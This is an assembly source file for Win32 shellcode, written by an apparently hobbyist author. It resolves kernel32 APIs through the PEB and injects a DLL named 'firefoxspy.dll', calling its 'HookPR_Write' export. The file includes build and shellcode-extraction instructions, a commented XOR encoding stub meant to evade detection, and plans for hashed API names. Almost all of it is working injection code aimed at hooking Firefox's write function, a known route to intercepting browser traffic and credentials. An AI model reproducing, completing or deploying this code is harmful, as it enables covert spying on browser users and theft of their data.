;    +++[ kirikou.asm by h4lf-jiffie (dohmatob elvis dopgima): a smart win32 DLL-injector ]+++
; Tested OK on 7 and xp

; /!\ This is for educational purposes only, ripped straight-outta my daily ramblings. But that's besides the point ..

; HOWTO:
;    0]-- Compile with 'nasm -f bin -o kirikou.bin kirikou.asm'
;    1]-- Use some opcode wizard to extract the generated shellcode. I use PYHTON.
;         Viz, 'shellcode = open("kirikou.bin", "rb").read()'. You have the fire!

; XXX TODO: Use API name hashes instead of strings (les opcodes seront plus discr�t et moins lourd!)
; XXX TODO: Question-4-Answer: Shouldn't we suspend all other threads before hooking anything
;           (at least all those threads whose EIP lie within the bytes being patched)?

; 4CKNOWLEDGEMENT5:
; 0]-- http://www.projectshellcode.com
; 1]-- HARMONY SECURITY (http://blog.harmonysecurity.com/2009_06_01_archive.html)
; 2]-- http://www.infond.fr/2009/09/tutoriel-initiation-aux-shellcodes.html      
; 3]-- phr4ck Issue 0x3e by sk <sk at scan-associates d0t net>

[SECTION .text]

; set the code to be 32-bit
; Tip: If you don't have this line in more complex shellcode,
;    the resulting instructions may end up being different to
;    what you were expecting.
BITS 32

global _start
    
_start:
    pushad
    pushfd
    jmp         entry_point
 
;crypto:
;    fldz
;    fnstenv [esp-0xC]
;    pop eax
;    add al, 10
;    nop
;    add eax,(entry_point - crypto - 0xA)    ; PROOF. It holds that @entry_point = @here + (@entry_point - @here)
;                                            ; && @entry_point - @here = (@entry_point - @crypto) - (@here - @crypto)
;                                            ; && @here = eax.  
;                                            ; But olldbg tells me: @here - @crypto = 10 bytes.
;                                            ; Thus, @entry_point = eax + (@entry_point - @crypto) - 0xA = 
;                                            ; eax + (@entry_point - J) - (@crypto - J) - 0xA, for all J.
;                                            ; Q.E.D.
;                                             
;    mov esi,eax                 ; esi = @entry_point
;    mov edi, esi
;    xor ecx,ecx
;    mov ecx,(zthe_end - entry_point) ; size of code to encode/decode
;    
;loop1:
;    lodsb 
;    xor 	al, 96h         ; 0x96 is the key
;    stosb
;    loop 	loop1
    
entry_point:
    xor         eax,eax
    xor         ebx,ebx 
    xor         ecx,ecx
    xor         esi,esi
    xor         edi,edi
				; we've cleared the general purpose registers
    jmp         get_kernel32
    
get_kernel32:
    mov         edx,[fs:0x30]	; get a pointer to the PEB, at an offset of 48 bytes in the current TEB
    mov         edx,[edx + 0x0C]; get PEB->Ldr, at an offset of 2+1+1+2*4 = 12 bytes in the PEB
    mov         edx,[edx + 0x14]; get PEB->Ldr.InMemoryOrderModuleList.Flink (1st entry), at an offset of
                                ; 8+3*4 = 20 bytes from PEB->Ldr
    mov         edx,[edx]       ; get the next entry (2nd entry)
    mov         edx,[edx]	; get the next entry (3rd entry)
    mov         edx,[edx + 0x10]; get the 3rd entry's base address (kernel32.dll), at an offset of
                                ; 2*4+2*4 = 16 bytes from the entry's starting point
    
get_export_directory_table:
    mov         ebx,[edx + 0x3c]; ebx = offset of PE signature in kernel32.dll
    mov         ebx,[edx + ebx + 0x78]
				; ebx = offset of Export Directory Table in kernel32.dll
    add         ebx,edx         ; ebx = adress of Export Directory Table
    
get_GetProcAddress_address:
    mov         ecx,[ebx+0x18]  ; ecx = nb of exported APIs (counter)
    mov         eax,[ebx+0x20]  ; eax = offset of Export Name Pointer Table in kernel2.dll
    add         eax,edx         ; eax = address of Export Name Pointer Table
	
find_GetProcAddress:
    call        get_address_of_GetProcAddress
    pop         edi             ; edi = address of 'GetProcAddress' string
    dec         ecx             ; we'll index the APIs in reverse order; start from highest index
    mov         esi,[eax+ecx*4] ; esi = ordinal of 'APIName\n' in Name Pointer Table
    add         esi,edx         ; esi = adress of 'APIName\n' in Name Pointer Table
    push        ecx             ; store
    xor         ecx,ecx
    add         cl,14           ; ecx = length of "GetProcAddress" string
    repe        cmpsb           ; compare the strings pointed to by edi and esi
    pop         ecx             ; restore: ecx = nb exported APIs
    jnz         find_GetProcAddress
    mov         eax, [ebx+0x24] ; eax = offset Ordinal Table in kernel32.dll
    add         eax,edx         ; eax = adresse Ordinal Table
    mov         cx, [eax+ecx*2] ; cx = API ordinal - first ordinal
    mov         ax,[ebx+0x10]   ; eax = first ordinal in the table table
    add         cx,ax           ; cx = ordinal de la API
    dec         cx              ; to fall just in-phase (ordinal starts at 0)
    mov         eax,[ebx+0x1c]  ; eax = offset Export Address Table
    add         eax,edx         ; eax = adress of Export Address Table
    mov         eax,[eax+ecx*4] ; eax = offset of GetProcAddress kernel32.dll
    add         eax,edx 	; eax = adress of GetProcAddress API
    call        get_address_of_GetProcAddress
    pop         edi             ; edi = address of 'GetProcAddress' string
    stosd			; save back to source address!
    
load_useful_kernel32dll_APIs:
    call        get_address_of_useful_kernel32dll_APIs
    pop 	esi	        ; esi now points to the NULL-seperated list/table of APIs we'll be loading from kernel32.dll
    call	load_APIs	
				; XXX Do error-checks here!
   
dll_business:
    call        get_address_of_useful_kernel32dll_APIs
    pop         edi
    call        get_address_of_dll_path
    call        [edi+0x4*3]     ; GetModuleHandleA(dll path)
    test        eax,eax
    jz          load_dll
    jmp         before_unloading_dll
    ;jmp         quit
    
load_dll:
    call        get_address_of_useful_kernel32dll_APIs
    pop         edi
    call        get_address_of_dll_path
    call        [edi+0x4*4]     ; LoadLibraryA(dll path)
    test        eax,eax
    jz          error
    jmp         after_loading_dll
    
after_loading_dll:
    mov         edx,eax
    call        load_useful_dll_APIs
    call        get_address_of_useful_dll_APIs
    pop         edi
    mov         eax,[edi]
    test        eax,eax
    jz          error
    call        eax
    jmp         quit
    
before_unloading_dll:
    push        eax             ; save
    mov         edx,eax
    call        load_useful_dll_APIs
    call        get_address_of_useful_dll_APIs
    pop         edi
    mov         eax,[edi+0x4]
    test        eax,eax
    jz          error
    call        eax
    pop         eax             ; restore
    jmp         unload_dll
    
unload_dll:
    call        get_address_of_useful_kernel32dll_APIs
    pop         edi
    push        eax             ; dll handle returned by GetModuleHandleA
    call        [edi+0x4*2]     ; FreeLibrary(dll handle)
    jmp         quit
   
load_useful_dll_APIs:
    call        get_address_of_useful_dll_APIs
    pop 	esi	        ; esi now points to the NULL-seperated list/table of APIs we'll be loading from kernel32.dll
    call	load_APIs	
				; XXX Do error-checks here!
                                
load_APIs:
				; @description: loads a bunch of APIs from a DLL
                                ; Here, I expect:
                                ; 0]-- edx set to the address of the DLL from which we'll load the APIs
                                ; 1]-- esi pointing to the NULL-seperated list/table of to-be-loaded APIs
    push	esi	        ; save
    call        get_address_of_GetProcAddress
    pop         edi 
    pop		esi		; restore
    mov		ebx,[edi]	; ebx  = address of GetProcAddress API   
    mov         edi,esi	        ; Assuming no API name is less than 4 bytes long (this is no loss of generality
                                ; as we may replace the said names with 4-byte hashes generality as we), we'll 
				; progressively override the said table of API names (pointed-to by esi) with 
				; addresses of the loaded APIs. BTW, we won't be needing these names in future!
    
load_next_API:
				; loop until zero-byte (new table entry marker) found
    lodsb
    test	al,al
    jnz         load_next_API

check_end_of_API_table:
    lodsb
    dec		esi 		; fix-up
    test	al,al
    jz 		load_APIs_end	

continue_load_next_API:
    push	ebx  		; save
    push 	edx		; save
    push	esi  
    push	edx  		; DLL address
    ;int3
    call	ebx  		; GetProcAddress(DLL address, API_Name)
    ;int3			; uncomment this INT3 and inspect eax in a debugger (ollydbg?) if u will
    pop         edx		; restore 
    pop	        ebx		; restore   
    stosd			; write the output to EDI
    add         esi,0x3         ; substract strlen of shortest API name - 1
    jmp		load_next_API	

load_APIs_end:
    ret				; j ==> [edi - 4*j], for j = 1,2,.., maps (LIFO) the addresses of the loaded APIs
    
error:
				; this is just a stub
    call        get_address_of_useful_kernel32dll_APIs
    pop         edi
    call        [edi]           ; GetLastError()
    jmp		quit
   
quit:
    popfd
    popad
    ret
    ;call        get_address_of_useful_kernel32dll_APIs
    ;pop         edi
    ;push 	0x0
    ;call	[edi+0x4*5]	; ExitThread(0x0)	
    
get_address_of_GetProcAddress:
    pop		esi
    call        esi
    db 'GetProcAddress'
    db 0x0
    
get_address_of_useful_kernel32dll_APIs:
    pop         esi             
    call        esi     
    db 0x0 			; <- marks beginning of next table entr
    db "GetLastError"
    db 0x0
    db "VirtualProtect"
    db 0x0
    db "FreeLibrary"
    db 0x0
    db "GetModuleHandleA"
    db 0x0
    db "LoadLibraryA"
    db 0x0
    db "ExitThread"
    db 0x0
    db "FreeLibraryA"
    db 0x0
				; <- add other API (NULL-seperated!) names here if you will
    db 0x0                      ; <- marks end of this table
    
get_address_of_dll_path:
    pop         esi
    call        esi
    db "firefoxspy.dll"         ; or what you will
    db 0x0
    
get_address_of_useful_dll_APIs:
    pop         esi
    call        esi
    db 0x0
    db "HookPR_Write"              ; or some other API exported by your DLL
    db 0x0
    db "UnhookPR_Write"
    db 0x0
    db 0x0
    
zthe_end:

; (c) h4lf-jiffie (gmdopp@gmail.com)




